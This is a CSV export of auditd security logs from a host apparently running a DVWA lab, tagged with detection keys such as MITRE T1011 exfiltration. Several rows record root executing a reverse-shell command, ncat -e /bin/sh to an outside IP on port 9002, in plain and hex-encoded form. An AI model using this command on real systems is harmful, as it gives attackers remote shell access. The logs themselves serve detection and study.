"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version","auditd.log.AUID","auditd.log.EGID","auditd.log.EUID","auditd.log.FSGID","auditd.log.FSUID","auditd.log.GID","auditd.log.OGID","auditd.log.OLD-AUID","auditd.log.SGID","auditd.log.SUID","auditd.log.SYSCALL","auditd.log.UID","auditd.log.a0","auditd.log.a1","auditd.log.a2","auditd.log.a3","auditd.log.arch","auditd.log.cap_fe","auditd.log.cap_fi","auditd.log.cap_fp","auditd.log.cap_frootid","auditd.log.cap_fver","auditd.log.dev","auditd.log.epoch","auditd.log.fe","auditd.log.fi","auditd.log.fp","auditd.log.frootid","auditd.log.fver","auditd.log.grantors","auditd.log.hostname","auditd.log.inode","auditd.log.item","auditd.log.items","auditd.log.key","auditd.log.kv","auditd.log.laddr","auditd.log.lport","auditd.log.mode","auditd.log.name","auditd.log.nametype","auditd.log.nlnk-fam","auditd.log.nlnk-pid","auditd.log.old_auid","auditd.log.old_pa","auditd.log.old_pe","auditd.log.old_pi","auditd.log.old_pp","auditd.log.old_ses","auditd.log.op","auditd.log.pa","auditd.log.pe","auditd.log.pi","auditd.log.pp","auditd.log.proctitle","auditd.log.rdev","auditd.log.record_type","auditd.log.saddr","auditd.log.saddr_fam","auditd.log.sequence","auditd.log.ses","auditd.log.subj_apparmor","auditd.log.success","auditd.log.syscall","auditd.log.tty","auditd.log.uid","ecs.version","error.message","event.action","event.category","event.dataset","event.ingested","event.kind","event.module","event.original","event.outcome","event.type","fileset.name","host.architecture","host.containerized","host.hostname","host.id","host.ip","host.mac","host.name","host.os.codename","host.os.family","host.os.kernel","host.os.name","host.os.name.text","host.os.platform","host.os.type","host.os.version","input.type","log.file.path","log.offset",message,"network.direction","process.args","process.args_count","process.executable","process.executable.text","process.exit_code","process.name","process.name.text","process.parent.pid","process.pid","process.working_directory","process.working_directory.text","service.type","source.address","source.as.number","source.as.organization.name","source.as.organization.name.text","source.geo.city_name","source.geo.continent_name","source.geo.country_iso_code","source.geo.country_name","source.geo.location","source.geo.region_iso_code","source.geo.region_name","source.ip","traefik.access.geoip.city_name","traefik.access.geoip.continent_name","traefik.access.geoip.country_iso_code","traefik.access.geoip.location","traefik.access.geoip.region_iso_code","traefik.access.geoip.region_name","user.audit.id","user.effective.group.id","user.effective.id","user.effective.name","user.effective.name.text","user.filesystem.group.id","user.filesystem.id","user.group.id","user.id","user.name","user.name.text","user.owner.group.id","user.owner.id","user.saved.group.id","user.saved.id","user.terminal"
"Oct 24, 2022 @ 23:30:01.749",XOCdCoQBDsc6tFfSepE6,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",root,root,root,root,root,root,"-","-",root,root,socket,root,2,80802,0,fffffffffffffe7d,"x86_64","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",0,"T1011_Exfiltration_Over_Other_Network_Medium""ARCH=x86_64","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","484,834",44,"-",yes,41,"(none)","-","1.12.0","-",syscall,process,"auditd.log","Oct 24, 2022 @ 23:30:03.441",event,auditd,"type=SYSCALL msg=audit(1666625401.749:484834): arch=c000003e syscall=41 success=yes exit=4 a0=2 a1=80802 a2=0 a3=fffffffffffffe7d items=0 ppid=256718 pid=256721 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=44 comm=""sendmail"" exe=""/usr/sbin/exim4"" subj=? key=""T1011_Exfiltration_Over_Other_Network_Medium""ARCH=x86_64 SYSCALL=socket AUID=""root"" UID=""root"" GID=""root"" EUID=""root"" SUID=""root"" FSUID=""root"" EGID=""root"" SGID=""root"" FSGID=""root""","-",info,log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,851,437","-","-","-","-","/usr/sbin/exim4","/usr/sbin/exim4",4,sendmail,sendmail,"256,718","256,721","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",0,0,0,"-","-",0,0,0,0,"-","-","-","-",0,0,"-"
"Oct 24, 2022 @ 23:30:01.749",XeCdCoQBDsc6tFfSepE6,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","/usr/sbin/sendmail^@-FCronDaemon^@-i^@-B8BITMIME^@-oem^@root","-","-","-","-","484,834","-","-","-","-","-","-","1.12.0","-",proctitle,"-","auditd.log","Oct 24, 2022 @ 23:30:03.442",event,auditd,"type=PROCTITLE msg=audit(1666625401.749:484834): proctitle=2F7573722F7362696E2F73656E646D61696C002D4643726F6E4461656D6F6E002D69002D42384249544D494D45002D6F656D00726F6F74","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,851,910","-","-","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:30:01.749",XuCdCoQBDsc6tFfSepE6,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","484,834","-",unconfined,"-","-","-","-","1.12.0","-","unknown[1420]","-","auditd.log","Oct 24, 2022 @ 23:30:03.442",event,auditd,"type=UNKNOWN[1420] msg=audit(1666625401.749:484834): subj_apparmor=unconfined","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,852,080","-","-","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:30:01.749","X-CdCoQBDsc6tFfSepE6",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",root,root,root,root,root,root,"-","-",root,root,connect,root,4,7f7e083d1c54,10,fffffffffffffe7d,"x86_64","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",0,"network_connect_4""ARCH=x86_64","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","484,835",44,"-",yes,42,"(none)","-","1.12.0","-",syscall,process,"auditd.log","Oct 24, 2022 @ 23:30:03.442",event,auditd,"type=SYSCALL msg=audit(1666625401.749:484835): arch=c000003e syscall=42 success=yes exit=0 a0=4 a1=7f7e083d1c54 a2=10 a3=fffffffffffffe7d items=0 ppid=256718 pid=256721 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=44 comm=""sendmail"" exe=""/usr/sbin/exim4"" subj=? key=""network_connect_4""ARCH=x86_64 SYSCALL=connect AUID=""root"" UID=""root"" GID=""root"" EUID=""root"" SUID=""root"" FSUID=""root"" EGID=""root"" SGID=""root"" FSGID=""root""","-",info,log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,852,158","-",egress,"-","-","/usr/sbin/exim4","/usr/sbin/exim4",0,sendmail,sendmail,"256,718","256,721","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",0,0,0,"-","-",0,0,0,0,"-","-","-","-",0,0,"-"
"Oct 24, 2022 @ 23:30:01.749",YeCdCoQBDsc6tFfSepE6,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","/usr/sbin/sendmail^@-FCronDaemon^@-i^@-B8BITMIME^@-oem^@root","-","-","-","-","484,835","-","-","-","-","-","-","1.12.0","-",proctitle,"-","auditd.log","Oct 24, 2022 @ 23:30:03.442",event,auditd,"type=PROCTITLE msg=audit(1666625401.749:484835): proctitle=2F7573722F7362696E2F73656E646D61696C002D4643726F6E4461656D6F6E002D69002D42384249544D494D45002D6F656D00726F6F74","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,852,751","-","-","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:30:01.749",YuCdCoQBDsc6tFfSepE6,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","484,835","-",unconfined,"-","-","-","-","1.12.0","-","unknown[1420]","-","auditd.log","Oct 24, 2022 @ 23:30:03.443",event,auditd,"type=UNKNOWN[1420] msg=audit(1666625401.749:484835): subj_apparmor=unconfined","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,852,921","-","-","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:30:01.745",WeCdCoQBDsc6tFfSepE6,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",root,root,root,root,root,root,"-","-",root,root,socket,root,2,1,6,55f7c1ad7060,"x86_64","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",0,"T1011_Exfiltration_Over_Other_Network_Medium""ARCH=x86_64","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","484,833",44,"-",yes,41,"(none)","-","1.12.0","-",syscall,process,"auditd.log","Oct 24, 2022 @ 23:30:03.441",event,auditd,"type=SYSCALL msg=audit(1666625401.745:484833): arch=c000003e syscall=41 success=yes exit=3 a0=2 a1=1 a2=6 a3=55f7c1ad7060 items=0 ppid=256719 pid=256720 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=44 comm=""ncat"" exe=""/usr/bin/ncat"" subj=? key=""T1011_Exfiltration_Over_Other_Network_Medium""ARCH=x86_64 SYSCALL=socket AUID=""root"" UID=""root"" GID=""root"" EUID=""root"" SUID=""root"" FSUID=""root"" EGID=""root"" SGID=""root"" FSGID=""root""","-",info,log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,850,768","-","-","-","-","/usr/bin/ncat","/usr/bin/ncat",3,ncat,ncat,"256,719","256,720","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",0,0,0,"-","-",0,0,0,0,"-","-","-","-",0,0,"-"
"Oct 24, 2022 @ 23:30:01.745",WuCdCoQBDsc6tFfSepE6,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","ncat^@-e^@/bin/sh^@123.123.123.250^@9002","-","-","-","-","484,833","-","-","-","-","-","-","1.12.0","-",proctitle,"-","auditd.log","Oct 24, 2022 @ 23:30:03.441",event,auditd,"type=PROCTITLE msg=audit(1666625401.745:484833): proctitle=6E636174002D65002F62696E2F7368003132332E3132332E3132332E3235300039303032","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,851,227","-","-","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:30:01.745","W-CdCoQBDsc6tFfSepE6",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","484,833","-",unconfined,"-","-","-","-","1.12.0","-","unknown[1420]","-","auditd.log","Oct 24, 2022 @ 23:30:03.441",event,auditd,"type=UNKNOWN[1420] msg=audit(1666625401.745:484833): subj_apparmor=unconfined","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,851,359","-","-","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:30:01.741",UOCdCoQBDsc6tFfSepEq,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3",root,root,root,root,root,root,"-","-",root,root,execve,root,564c240e2598,564c22f1c988,564c240e2568,6f,"x86_64","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",2,"susp_activity""ARCH=x86_64","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","484,832",44,"-",yes,59,"(none)","-","1.12.0","-",syscall,process,"auditd.log","Oct 24, 2022 @ 23:30:03.433",event,auditd,"type=SYSCALL msg=audit(1666625401.741:484832): arch=c000003e syscall=59 success=yes exit=0 a0=564c240e2598 a1=564c22f1c988 a2=564c240e2568 a3=6f items=2 ppid=256719 pid=256720 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=44 comm=""ncat"" exe=""/usr/bin/ncat"" subj=? key=""susp_activity""ARCH=x86_64 SYSCALL=execve AUID=""root"" UID=""root"" GID=""root"" EUID=""root"" SUID=""root"" FSUID=""root"" EGID=""root"" SGID=""root"" FSGID=""root""","-",info,log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,849,210","-","-","-","-","/usr/bin/ncat","/usr/bin/ncat",0,ncat,ncat,"256,719","256,720","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",0,0,0,"-","-",0,0,0,0,"-","-","-","-",0,0,"-"
"Oct 24, 2022 @ 23:30:01.741",UeCdCoQBDsc6tFfSepEq,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",0,0,0,0,0,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",0,0000003fffffffff,0,0000003fffffffff,"-","-",0,0000003fffffffff,0,0000003fffffffff,"-","-","-","-","-","484,832","-","-","-","-","-","-","1.12.0","-","bprm_fcaps","-","auditd.log","Oct 24, 2022 @ 23:30:03.433",event,auditd,"type=BPRM_FCAPS msg=audit(1666625401.741:484832): fver=0 fp=0 fi=0 fe=0 old_pp=0000003fffffffff old_pi=0 old_pe=0000003fffffffff old_pa=0 pp=0000003fffffffff pi=0 pe=0000003fffffffff pa=0 frootid=0","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,849,661","-","-","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:30:01.741",UuCdCoQBDsc6tFfSepEq,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","484,832","-","-","-","-","-","-","1.12.0","-",execve,"-","auditd.log","Oct 24, 2022 @ 23:30:03.433",event,auditd,"type=EXECVE msg=audit(1666625401.741:484832): argc=5 a0=""ncat"" a1=""-e"" a2=""/bin/sh"" a3=""123.123.123.250"" a4=""9002""","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,849,859","-","-","ncat, -e, /bin/sh, 123.123.123.250, 9002",5,ncat,ncat,"-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
"Oct 24, 2022 @ 23:30:01.741",VOCdCoQBDsc6tFfSepEq,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-",root,"-","-","-","-","-","-","-","-","-","-",0,0,0,"0OUID=""root",0,"00:62","-","-","-","-","-","-","-","-",6308269,0,"-","-","-","-","-",0100755,"/usr/bin/ncat",NORMAL,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","00:00","-","-","-","484,832","-","-","-","-","-","-","1.12.0","-",path,"-","auditd.log","Oct 24, 2022 @ 23:30:03.434",event,auditd,"type=PATH msg=audit(1666625401.741:484832): item=0 name=""/usr/bin/ncat"" inode=6308269 dev=00:62 mode=0100755 ouid=0 ogid=0 rdev=00:00 obj=? nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root""","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,850,027","-","-","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",0,0,"-","-","-"
"Oct 24, 2022 @ 23:30:01.741",VuCdCoQBDsc6tFfSepEq,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-",root,"-","-","-","-","-","-","-","-","-","-",0,0,0,"0OUID=""root",0,"00:62","-","-","-","-","-","-","-","-",6300581,1,"-","-","-","-","-",0100755,"/lib64/ld-linux-x86-64.so.2",NORMAL,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","00:00","-","-","-","484,832","-","-","-","-","-","-","1.12.0","-",path,"-","auditd.log","Oct 24, 2022 @ 23:30:03.434",event,auditd,"type=PATH msg=audit(1666625401.741:484832): item=1 name=""/lib64/ld-linux-x86-64.so.2"" inode=6300581 dev=00:62 mode=0100755 ouid=0 ogid=0 rdev=00:00 obj=? nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID=""root"" OGID=""root""","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,850,312","-","-","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",0,0,"-","-","-"
"Oct 24, 2022 @ 23:30:01.741","V-CdCoQBDsc6tFfSepEq",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","ncat^@-e^@/bin/sh^@123.123.123.250^@9002","-","-","-","-","484,832","-","-","-","-","-","-","1.12.0","-",proctitle,"-","auditd.log","Oct 24, 2022 @ 23:30:03.434",event,auditd,"type=PROCTITLE msg=audit(1666625401.741:484832): proctitle=6E636174002D65002F62696E2F7368003132332E3132332E3132332E3235300039303032","-","-",log,"x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",log,"/var/log/audit/audit.log","3,850,558","-","-","-","-","-","-","-","-","-","-","-","-","-",auditd,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-"
